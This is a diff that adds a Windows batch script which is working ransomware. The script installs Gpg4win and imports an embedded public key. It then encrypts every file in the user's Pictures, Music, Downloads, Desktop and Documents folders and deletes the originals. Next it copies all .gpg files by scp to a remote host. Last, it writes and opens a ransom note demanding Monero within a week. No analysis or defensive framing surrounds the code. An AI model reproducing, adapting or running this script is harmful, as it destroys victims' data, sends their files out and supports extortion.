@@ -1,0 +1,87 @@
+@echo off
+setlocal enabledelayedexpansion
+
+
+winget --version >nul 2>&1
+if %errorlevel%==0 (
+    echo Winget is installed
+) else (
+    echo Winget is NOT installed, please install it.
+    pause
+    exit
+)
+
+
+
+winget install GnuPG.Gpg4win
+echo.
+echo Checking installation...
+gpg --version
+ 
+powershell -Command "$k=@'
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+
+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
++94G4hGr2nHaH4RuPpAN4Tuy
+=RsBc                                                                              
+
+-----END PGP PUBLIC KEY BLOCK-----
+'@; $k | gpg --import"
+for /r "%USERPROFILE%\Pictures" %%F in (*) do if /i not "%%~xF"==".gpg" (gpg --batch --yes --encrypt --recipient "kaklaik@proton.me" --trust-model always "%%F" && del "%%F")
+for /r "%USERPROFILE%\Music" %%F in (*) do if /i not "%%~xF"==".gpg" (gpg --batch --yes --encrypt --recipient "kaklaik@proton.me" --trust-model always "%%F" && del "%%F")
+for /r "%USERPROFILE%\Downloads" %%F in (*) do if /i not "%%~xF"==".gpg" (gpg --batch --yes --encrypt --recipient "kaklaik@proton.me" --trust-model always "%%F" && del "%%F")
+for /r "%USERPROFILE%\Desktop" %%F in (*) do if /i not "%%~xF"==".gpg" (gpg --batch --yes --encrypt --recipient "kaklaik@proton.me" --trust-model always "%%F" && del "%%F")
+for /r "%USERPROFILE%\Documents" %%F in (*) do if /i not "%%~xF"==".gpg" (gpg --batch --yes --encrypt --recipient "kaklaik@proton.me" --trust-model always "%%F" && del "%%F")
+for /r "C:\" %%F in (*.gpg) do scp "%%F" user@192.168.1.100:/yourfolder/
+echo Q: why am I in notepad? A: just read it.. Q: Did anything happen to my computer? A: Yes all the files in, pictures, music, downloads, desktop, and documents have been encrypted, and only I can unencrypt them. Q: can you please unencrypt them for me A: yes, but, first you will need to send 100 dollars worth of t
+he cryptocurrency monero to XXXXXXXXXXXXXXXXXXXXXXXXXX Q: how will you unencrypt it after my payment? A: I will send you a special executable that can decrypt it. Q: what happens if I dont pay? A: you have lots of time to pay, you have a week! Yes, the full seven days! But if you dont pay in a week, your
+files will stay encrypted, in some insanely hard way which I dont believe exists, you can SOMEHOW unencrypt your files, but dont get too excited, I will say this, with no offense, that you are probably bad at tech, so you will not be able to do it yourself! Q: do I pay you first? A: do not pay first, files, then pay, if you pay, I will give you a app that will unencrypt all your files.  > note.txt
+
+start notepad note.txt
